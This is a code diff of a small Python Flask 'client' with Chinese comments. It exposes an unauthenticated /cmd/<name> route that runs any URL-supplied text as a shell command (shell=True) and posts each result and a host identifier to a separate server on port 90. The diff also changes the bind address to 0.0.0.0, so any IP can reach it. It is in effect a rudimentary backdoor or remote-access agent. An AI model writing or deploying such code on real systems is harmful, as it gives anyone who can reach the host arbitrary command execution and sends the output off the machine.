@@ -10,8 +10,10 @@ import requests
 from flask import Flask
 
 app = Flask(__name__)
+
+
 # 客户端
-@app.route('cmd/<name>')
+@app.route('/cmd/<name>')
 def cmd(name):
     screenData = subprocess.Popen(name, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # stage
     # subprocesses最后完成的内容是一个文件对象
@@ -32,12 +34,22 @@ def cmd(name):
         dem_stdout = line.decode('gbk').encode('utf-8')
         print(dem_stdout)
         print(m_stdout)
+        # 生成时间戳作为该主机的标识符
         uid = time.time()
-        requests.post("http://172.0.0.1:90/result/", data={'name': dem_stdout})
-        requests.post("http://172.0.0.1:90/info/", data={'uid': uid})
+        # 向sever发送连接请求
+        requests.post("http://127.0.0.1:90/result/", data={'name': dem_stdout})
+        requests.post("http://127.0.0.1:90/info/", data={'uid': uid})
 
     # 跳出文件处理的循环，但不是退出连接
     return str(m_stdout)
 
+
 if __name__ == '__main__':
-    app.run('127.0.0.1', 80, True)
+    # 接受来自任何ip80端口的请求
+    app.run('0.0.0.0', 80, True)
+
+    # 获取本机ip
+    # ip = socket.gethostbyname(socket.gethostname())
+    #
+    # # 发送本机ip
+    # requests.post("http://127.0.0.1:90", data={'ip': ip})
